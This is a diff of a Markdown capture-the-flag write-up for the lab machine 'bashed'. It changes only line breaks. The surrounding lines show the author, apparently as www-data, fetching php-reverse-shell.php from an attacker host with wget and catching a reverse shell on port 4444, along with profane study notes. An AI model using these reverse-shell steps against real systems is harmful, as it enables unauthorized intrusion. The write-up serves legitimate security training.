@@ -74,6 +74,7 @@ User www-data may run the following commands on bashed:
 
 - Don't be cocky and actually enumerate before spending 10 minutes trying to search a path on your own you dickhead.
 - Frustration can sometimes blind you. Or make you go down rabit holes of trying to get a fucking RS
+
 ---
 ## Notes  
 
@@ -107,6 +108,7 @@ www-data@bashed :/var/www/html/dev# cd ..
 www-data@bashed :/var/www/html# cd uploads 
 www-data@bashed :/var/www/html/uploads# 
 wget http://10.10.14.119:8080/php-reverse-shell.php 
+
 --2026-05-06 16:35:20-- 
 http://10.10.14.119:8080/php-reverse-shell.php 
 Connecting to 10.10.14.119:8080... connected. HTTP request sent, awaiting response... 
@@ -117,7 +119,8 @@ listening on [any] 4444 ...
 connect to [10.10.14.119] from (UNKNOWN) [10.129.31.135] 50638 Linux bashed 4.4.0-62-generic 
 #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 16:35:31 up 3 min, 0 users, load average: 0.01, 0.04, 0.01 
 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT 
-uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off 
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+/bin/sh: 0: can't access tty; job control turned off 
 $
 ```
 
